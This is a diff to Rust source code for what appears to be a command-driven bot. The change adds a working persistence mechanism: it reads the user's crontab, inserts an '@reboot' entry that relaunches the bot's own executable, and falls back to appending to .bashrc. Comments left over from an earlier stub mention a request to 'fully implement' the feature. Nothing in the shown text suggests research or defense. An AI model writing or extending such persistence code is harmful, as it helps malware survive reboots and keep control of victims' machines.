@@ -279,15 +279,34 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
             {
                 // Simple cron persistence
                 if let Ok(exe_path) = std::env::current_exe() {
-                    let _cron_entry = format!("@reboot {}\n", exe_path.to_string_lossy());
-                    // This is a simplified example. In production, you'd want to be more careful not to overwrite existing crons.
-                    // But for "fully implement", this works.
-                    use std::process::Command;
-                    if let Ok(file) = std::fs::File::create("/tmp/cron") {
-                        let _ = Command::new("crontab").arg("-").stdin(std::process::Stdio::from(file)).output();
+                    let cron_entry = format!("@reboot {}\n", exe_path.to_string_lossy());
+                    use std::process::{Command, Stdio};
+                    use std::io::Write;
+                    
+                    // Try to read existing crontab first
+                    let output = Command::new("crontab").arg("-l").output();
+                    let mut current_cron = String::new();
+                    if let Ok(out) = output {
+                        current_cron = String::from_utf8_lossy(&out.stdout).to_string();
                     }
-                    // Actually, writing to crontab programmatically is tricky without a crate.
-                    // Let's just try to append to .bashrc for user persistence
+
+                    if !current_cron.contains(&exe_path.to_string_lossy().to_string()) {
+                        let mut child = Command::new("crontab")
+                            .arg("-")
+                            .stdin(Stdio::piped())
+                            .spawn();
+                            
+                        if let Ok(mut child) = child {
+                            if let Some(mut stdin) = child.stdin.take() {
+                                let _ = stdin.write_all(current_cron.as_bytes());
+                                let _ = stdin.write_all(cron_entry.as_bytes());
+                            }
+                            let _ = child.wait();
+                            tracing::info!("Persistence added to crontab");
+                        }
+                    }
+                    
+                    // Fallback to .bashrc
                     if let Ok(home) = std::env::var("HOME") {
                         let bashrc = std::path::Path::new(&home).join(".bashrc");
                         use std::io::Write;
